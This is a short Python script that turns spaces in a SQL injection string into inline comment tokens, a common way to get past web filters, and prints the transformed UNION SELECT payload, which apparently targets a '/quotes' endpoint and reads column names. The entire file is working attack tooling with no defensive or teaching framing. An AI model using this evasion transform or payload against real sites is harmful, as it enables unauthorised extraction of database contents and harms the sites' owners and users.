#!/usr/bin/env python3

def transform(text: str) -> str:
    return text.replace(" ", "/*\*/")

print(transform("/quotes 500 UNION SELECT 1, COLUMN_NAME FROM TABLE_NAME"))